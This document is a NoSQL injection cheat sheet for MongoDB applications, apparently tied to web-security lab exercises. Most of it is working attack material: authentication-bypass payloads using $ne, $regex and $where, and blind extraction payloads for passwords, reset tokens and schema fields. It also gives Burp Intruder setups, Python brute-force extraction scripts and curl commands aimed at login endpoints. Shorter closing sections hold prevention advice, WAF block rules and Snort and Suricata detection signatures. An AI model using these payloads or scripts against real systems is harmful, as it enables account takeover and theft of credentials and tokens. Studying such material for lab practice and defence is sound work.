# NoSQL Injection Cheat Sheet

## Detection Payloads

### Syntax Injection Detection

**Basic Tests:**
```
'
"
\
'+'
"+"
'||'
```

**URL Parameters:**
```
?category=test'
?category=test"
?category=test\
?category=test'%2b'
?category=test'%7c%7c'
```

**Boolean Logic Tests:**
```
test' && '1'=='1
test' && '1'=='2
test'||1||'
test'&&0&&'
```

### Operator Injection Detection

**JSON Format:**
```json
{"username": {"$ne": ""}}
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$exists": true}}
```

**URL-Encoded Format:**
```
username[$ne]=
username[$gt]=
username[$regex]=.*
username[$exists]=true
```

## Authentication Bypass

### MongoDB Operators

**Not Equal ($ne):**
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": null}}
```

**Greater Than ($gt, $gte):**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$gte": ""}}
```

**Regular Expression ($regex):**
```json
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
```

**In Array ($in):**
```json
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
```

**Not In Array ($nin):**
```json
{"username": "admin", "password": {"$nin": ["wrongpass"]}}
```

**Exists ($exists):**
```json
{"username": "admin", "password": {"$exists": true}}
```

### Syntax Injection Bypass

**Comment Injection:**
```
admin'--
admin'#
admin'//
admin'/*
```

**OR Logic:**
```
admin' || '1'=='1
admin' || 1==1 || '
' || 1==1 || '
' || true || '
```

**AND Logic Manipulation:**
```
admin' && '1'=='1
' && '1'=='1
```

## Data Extraction

### Boolean-Based Blind Injection

**Password Length:**
```javascript
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password.length < 30 || 'a'=='b
admin' && this.password.length > 5 || 'a'=='b
```

**Character Extraction (Array Access):**
```javascript
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password[1]=='b' || 'a'=='b
admin' && this.password[7]=='z' || 'a'=='b
```

**Character Extraction (charAt):**
```javascript
admin' && this.password.charAt(0)=='a' || 'a'=='b
```

**Character Extraction (substring):**
```javascript
admin' && this.password.substring(0,1)=='a' || 'a'=='b
admin' && this.password.substr(0,1)=='a' || 'a'=='b
```

**Regex Pattern Matching:**
```javascript
admin' && this.password.match('^a') || 'a'=='b
admin' && this.password.match('^.{2}c') || 'a'=='b
admin' && /^a/.test(this.password) || 'a'=='b
```

**ASCII Value (charCodeAt):**
```javascript
admin' && this.password.charCodeAt(0)==97 || 'a'=='b
// 97 = 'a', 98 = 'b', 122 = 'z'
```

### $where Operator Injection

**Basic Syntax:**
```json
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match('^a')"}
```

**Complex Conditions:**
```json
{"$where": "this.username == 'admin' && this.password.length < 30"}
{"$where": "this.role == 'admin' || this.isAdmin == true"}
```

**JavaScript Functions:**
```json
{"$where": "Object.keys(this).length > 0"}
{"$where": "JSON.stringify(this).includes('admin')"}
```

### Schema Enumeration

**Field Count:**
```json
{"$where": "Object.keys(this).length == 5"}
{"$where": "Object.keys(this).length < 10"}
```

**Field Names (by index):**
```json
{"$where": "Object.keys(this)[0] == '_id'"}
{"$where": "Object.keys(this)[1] == 'username'"}
{"$where": "Object.keys(this)[2].match('^pass')"}
```

**Field Name Extraction (character-by-character):**
```json
{"$where": "Object.keys(this)[1].match('^.{0}u.*')"}
{"$where": "Object.keys(this)[1].match('^.{1}s.*')"}
{"$where": "Object.keys(this)[1].match('^.{2}e.*')"}
```

**Field Existence:**
```json
{"$where": "'resetToken' in this"}
{"$where": "this.hasOwnProperty('resetToken')"}
{"$where": "this.resetToken !== undefined"}
```

**Field Type:**
```json
{"$where": "typeof this.resetToken === 'string'"}
{"$where": "Array.isArray(this.roles)"}
{"$where": "this.age instanceof Number"}
```

**Field Value Extraction:**
```json
{"$where": "this.resetToken.length == 32"}
{"$where": "this.resetToken.match('^.{0}a.*')"}
{"$where": "this.roles.includes('admin')"}
```

## URL Encoding Reference

### Essential Encodings

| Character | URL Encoded | Usage |
|-----------|-------------|-------|
| Space | `%20` | Separating keywords |
| `'` | `%27` | String delimiter |
| `"` | `%22` | String delimiter |
| `&` | `%26` | AND operator |
| `\|` | `%7c` | OR operator |
| `=` | `%3d` | Equality |
| `<` | `%3c` | Less than |
| `>` | `%3e` | Greater than |
| `[` | `%5b` | Array access |
| `]` | `%5d` | Array access |
| `{` | `%7b` | Object literal |
| `}` | `%7d` | Object literal |
| `$` | `%24` | MongoDB operator |

### Common Encoded Payloads

**Boolean AND:**
```
admin'%20%26%26%20'1'%3d%3d'1
# Decodes to: admin' && '1'=='1
```

**Boolean OR:**
```
admin'%7c%7c1%7c%7c'
# Decodes to: admin'||1||'
```

**$ne Operator:**
```
username[$ne]=
username%5B$ne%5D=
# Decodes to: username[$ne]=
```

## MongoDB Operators Reference

### Comparison Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$eq` | Equal | `{age: {$eq: 25}}` |
| `$ne` | Not equal | `{password: {$ne: ""}}` |
| `$gt` | Greater than | `{age: {$gt: 18}}` |
| `$gte` | Greater than or equal | `{age: {$gte: 18}}` |
| `$lt` | Less than | `{price: {$lt: 100}}` |
| `$lte` | Less than or equal | `{price: {$lte: 100}}` |
| `$in` | In array | `{role: {$in: ["admin"]}}` |
| `$nin` | Not in array | `{status: {$nin: ["banned"]}}` |

### Logical Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$and` | Logical AND | `{$and: [{age: {$gt: 18}}, {status: "active"}]}` |
| `$or` | Logical OR | `{$or: [{role: "admin"}, {role: "mod"}]}` |
| `$not` | Logical NOT | `{age: {$not: {$lt: 18}}}` |
| `$nor` | Logical NOR | `{$nor: [{status: "banned"}, {status: "deleted"}]}` |

### Element Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$exists` | Field exists | `{email: {$exists: true}}` |
| `$type` | Field type | `{age: {$type: "number"}}` |

### Evaluation Operators

| Operator | Description | Example | Risk Level |
|----------|-------------|---------|------------|
| `$regex` | Pattern match | `{name: {$regex: "^J"}}` | High |
| `$where` | JavaScript | `{$where: "this.age > 18"}` | Critical |
| `$expr` | Expression | `{$expr: {$gt: ["$spent", "$budget"]}}` | Medium |
| `$mod` | Modulo | `{age: {$mod: [2, 0]}}` | Low |

### Array Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$all` | All match | `{tags: {$all: ["red", "blue"]}}` |
| `$elemMatch` | Element matches | `{results: {$elemMatch: {$gte: 80}}}` |
| `$size` | Array size | `{tags: {$size: 3}}` |

## Burp Suite Intruder

### Attack Types

**Sniper:**
- Single payload set
- Test one position at a time
- Use: Sequential character testing

**Battering Ram:**
- Single payload set
- Same payload in all positions
- Use: Rare in NoSQL injection

**Pitchfork:**
- Multiple payload sets (one per position)
- Parallel iteration
- Use: Position-specific testing

**Cluster Bomb:**
- Multiple payload sets
- All combinations
- Use: Character extraction (position × character)

### Payload Configuration for Data Extraction

**Position 1 (Character Index):**
```
Type: Numbers
From: 0
To: 31
Step: 1
```

**Position 2 (Characters):**
```
Type: Simple list
Values: abcdefghijklmnopqrstuvwxyz0123456789
```

**For Hex Tokens:**
```
Type: Simple list
Values: 0123456789abcdef
```

**Request Template:**
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"x","$where":"this.password[§0§]=='§a§'"}
```

### Grep Match Configuration

**Success Indicators:**
```
Your username is:
Account locked
Welcome back
User found
```

**Add in Intruder:**
1. Options → Grep - Match
2. Add each success indicator
3. Check results with checkmark

## Python Automation Scripts

### Basic Boolean Extraction

```python
import requests
import string

def extract_password(url, username, length):
    password = ""
    chars = string.ascii_lowercase + string.digits

    for position in range(length):
        for char in chars:
            payload = f"{username}' && this.password[{position}]=='{char}' || 'x'=='y'"
            response = requests.get(url, params={'user': payload})

            if "Your username is:" in response.text:
                password += char
                print(f"[+] Position {position}: {char} → {password}")
                break

    return password

# Usage
url = "https://target.com/lookup"
password = extract_password(url, "administrator", 8)
print(f"\n[+] Password: {password}")
```

### Binary Search Optimization

```python
import requests

def binary_search_char(url, username, position):
    low, high = 97, 122  # ASCII 'a' to 'z'

    while low <= high:
        mid = (low + high) // 2
        payload = f"{username}' && this.password.charCodeAt({position})>{mid} || 'x'=='y'"

        response = requests.get(url, params={'user': payload})

        if "Your username is:" in response.text:
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)

# Extract password using binary search
password = ""
for i in range(8):
    char = binary_search_char("https://target.com/lookup", "admin", i)
    password += char
    print(f"Position {i}: {char}")

print(f"Password: {password}")
```

### Operator Injection

```python
import requests
import json

def test_operator_bypass(url, username):
    operators = [
        {"$ne": ""},
        {"$ne": null},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$exists": true}
    ]

    for op in operators:
        payload = {
            "username": username,
            "password": op
        }

        response = requests.post(url, json=payload)

        if response.status_code == 200 and "Welcome" in response.text:
            print(f"[+] Bypass successful with operator: {op}")
            return True

    return False

# Usage
test_operator_bypass("https://target.com/login", "administrator")
```

### Field Enumeration

```python
import requests
import string

def enumerate_fields(url, username, max_fields=10):
    fields = []
    chars = string.ascii_lowercase + string.digits + '_'

    for field_idx in range(max_fields):
        field_name = ""

        for pos in range(30):  # Max field name length
            found = False

            for char in chars:
                payload = {
                    "username": username,
                    "password": "invalid",
                    "$where": f"Object.keys(this)[{field_idx}].match('^.{{{pos}}}{char}.*')"
                }

                response = requests.post(url, json=payload)

                if "Account locked" in response.text:
                    field_name += char
                    print(f"[+] Field {field_idx}, Pos {pos}: {char} → {field_name}")
                    found = True
                    break

            if not found:
                if field_name:
                    fields.append(field_name)
                    print(f"[+] Field {field_idx} complete: {field_name}\n")
                break

        if not field_name:
            break

    return fields

# Usage
fields = enumerate_fields("https://target.com/login", "carlos")
print(f"\nDiscovered fields: {fields}")
```

## cURL Commands

### Syntax Injection

```bash
# Basic test
curl "http://target.com/filter?category=Gifts'"

# OR logic
curl "http://target.com/filter?category=Gifts'%7c%7c1%7c%7c'"

# Boolean test
curl "http://target.com/lookup?user=admin'%26%26'1'%3d%3d'1"
```

### Operator Injection

```bash
# $ne operator (JSON)
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# $regex operator
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"admin"},"password":{"$ne":""}}'

# $where operator
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x","$where":"1"}'
```

### URL-Encoded Operators

```bash
# $ne in URL-encoded format
curl -X POST http://target.com/login \
  -d 'username[$ne]=&password[$ne]='

# $gt operator
curl -X POST http://target.com/login \
  -d 'username=admin&password[$gt]='
```

## Prevention Checklist

### Code Level

- [ ] Use parameterized queries (no string concatenation)
- [ ] Validate input types (typeof checks)
- [ ] Sanitize user input (mongo-sanitize, validator.js)
- [ ] Use ODM/ORM frameworks (Mongoose, Spring Data)
- [ ] Implement schema validation
- [ ] Disable JavaScript execution in MongoDB (--noscripting)
- [ ] Never use $where operator with user input
- [ ] Whitelist allowed query operators
- [ ] Implement input length limits
- [ ] Use Content Security Policy headers

### Infrastructure Level

- [ ] Deploy Web Application Firewall (WAF)
- [ ] Configure rate limiting
- [ ] Implement request logging
- [ ] Monitor for suspicious patterns
- [ ] Use database activity monitoring
- [ ] Apply principle of least privilege
- [ ] Regular security audits
- [ ] Keep dependencies updated
- [ ] Enable database query logging
- [ ] Implement intrusion detection

### Testing Level

- [ ] Automated vulnerability scanning
- [ ] Manual penetration testing
- [ ] Code review for injection flaws
- [ ] SAST/DAST integration in CI/CD
- [ ] Regular security assessments
- [ ] Bug bounty program
- [ ] Security awareness training
- [ ] Incident response plan

## WAF Rules

### ModSecurity

```apache
# Block MongoDB operators
SecRule REQUEST_BODY "@rx \$(?:ne|gt|gte|lt|lte|in|nin|regex|where|exists|expr)" \
  "id:1001,phase:2,deny,status:403,msg:'NoSQL operator injection attempt'"

# Block Object.keys() attempts
SecRule REQUEST_BODY "@rx Object\.keys" \
  "id:1002,phase:2,deny,status:403,msg:'MongoDB schema enumeration attempt'"

# Block suspicious $where patterns
SecRule REQUEST_BODY "@rx \$where.*(?:this\.|Object\.|sleep|eval)" \
  "id:1003,phase:2,deny,status:403,msg:'NoSQL $where injection attempt'"

# Block special characters in JSON
SecRule REQUEST_BODY "@rx ['\"\$].*['\"\$]" \
  "id:1004,phase:2,deny,status:403,msg:'Suspicious JSON characters'"
```

### NGINX

```nginx
# Block NoSQL operators
location /api {
    if ($request_body ~* "\$(?:ne|gt|regex|where)") {
        return 403;
    }
    proxy_pass http://backend;
}

# Block Object.keys patterns
location /api {
    if ($request_body ~* "Object\.keys") {
        return 403;
    }
    proxy_pass http://backend;
}
```

## Detection Signatures

### Snort Rules

```
# Detect $ne operator
alert tcp any any -> any any (msg:"NoSQL Injection - $ne operator"; \
  flow:established,to_server; content:"$ne"; nocase; \
  classtype:web-application-attack; sid:1000001; rev:1;)

# Detect $where operator
alert tcp any any -> any any (msg:"NoSQL Injection - $where operator"; \
  flow:established,to_server; content:"$where"; nocase; \
  classtype:web-application-attack; sid:1000002; rev:1;)

# Detect Object.keys() usage
alert tcp any any -> any any (msg:"NoSQL Schema Enumeration"; \
  flow:established,to_server; content:"Object.keys"; nocase; \
  classtype:web-application-attack; sid:1000003; rev:1;)
```

### Suricata Rules

```
alert http any any -> any any (msg:"NoSQL Injection via JSON"; \
  flow:established,to_server; content:"application/json"; http_header; \
  content:"$ne"; http_client_body; classtype:web-application-attack; \
  sid:2000001; rev:1;)

alert http any any -> any any (msg:"NoSQL $where Injection"; \
  flow:established,to_server; content:"$where"; http_client_body; \
  content:"this."; http_client_body; classtype:web-application-attack; \
  sid:2000002; rev:1;)
```

## Error Messages

### MongoDB Errors

```
SyntaxError: unterminated string literal
ReferenceError: X is not defined
TypeError: Cannot read property 'X' of undefined
MongoError: $where is not allowed in this context
```

### Application Errors

```
"Could not find user"
"Invalid username or password"
"Account locked"
"Unauthorized"
"Invalid token"
```

### Success Indicators

```
"Your username is:"
"Welcome back"
"Login successful"
"Account locked: please reset your password"
User data displayed
```

## Quick Reference: Attack Flow

```
1. Detection
   └→ Test syntax: '
   └→ Test operator: {"$ne":""}

2. Authentication Bypass
   └→ $ne operator: {"username":"admin","password":{"$ne":""}}
   └→ OR logic: admin'||1||'

3. Data Extraction
   └→ Length: admin' && this.password.length<30||'x'=='y
   └→ Characters: admin' && this.password[0]=='a'||'x'=='y

4. Schema Discovery
   └→ Field count: {"$where":"Object.keys(this).length"}
   └→ Field names: {"$where":"Object.keys(this)[1].match('^u')"}

5. Token Extraction
   └→ Value: {"$where":"this.resetToken.match('^.{0}a.*')"}
```

## HTTP Status Codes

| Code | Meaning | Indication |
|------|---------|------------|
| 200 | OK | Possible success (check response body) |
| 400 | Bad Request | Input validation triggered |
| 401 | Unauthorized | Auth failed (normal) |
| 403 | Forbidden | WAF blocked request |
| 429 | Too Many Requests | Rate limiting triggered |
| 500 | Internal Server Error | Syntax error or server crash |

---

**Remember:** Only test on authorized systems. Unauthorized testing is illegal.

**Quick Lab Access:** https://portswigger.net/web-security/all-labs#nosql-injection
